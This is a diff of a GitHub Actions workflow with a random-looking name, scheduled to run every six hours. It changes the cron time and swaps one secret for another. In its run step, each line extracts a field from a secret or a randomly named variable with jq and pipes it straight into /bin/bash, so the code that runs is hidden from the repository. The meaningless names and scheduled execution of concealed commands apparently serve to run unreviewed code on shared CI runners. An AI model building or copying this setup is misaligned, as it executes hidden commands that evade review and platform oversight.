@@ -2,7 +2,7 @@ name: haosiwen19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 0/6 * * *'
+    - cron: '29 1/6 * * *'
 
 jobs:
   build:
@@ -12,14 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: haosiwen19871010
         env:
-          xyw8434: ${{ secrets.xyw8434 }}
+          bb961: ${{ secrets.bb961 }}
         run: |
-          echo $xyw8434 | jq -r .klqlq487 | /bin/bash
-          echo $tap09561 | jq -r .ipgpx36384 | /bin/bash
-          echo $hualx5 | jq -r .a48 | /bin/bash
-          echo $adqd05306 | jq -r .ph94898 | /bin/bash
-          echo $sals5672 | jq -r .uyfz0 | /bin/bash
-          echo $jvf1 | jq -r .l18 | /bin/bash
-          echo $kn340 | jq -r .j27 | /bin/bash
-          echo $xodzg68 | jq -r .ciqb41 | /bin/bash
+          echo $bb961 | jq -r .ws439 | /bin/bash
+          echo $em7251 | jq -r .yfq02 | /bin/bash
+          echo $rox2 | jq -r .zfy8 | /bin/bash
+          echo $vtpfe23707 | jq -r .uoi87 | /bin/bash
+          echo $a8001 | jq -r .ono011 | /bin/bash
+          echo $sqdr8 | jq -r .euilu631 | /bin/bash
+          echo $nv80651 | jq -r .munew357 | /bin/bash
+          echo $i607 | jq -r .qakxb010 | /bin/bash
+          echo $bvln35 | jq -r .whzfo8980 | /bin/bash
 
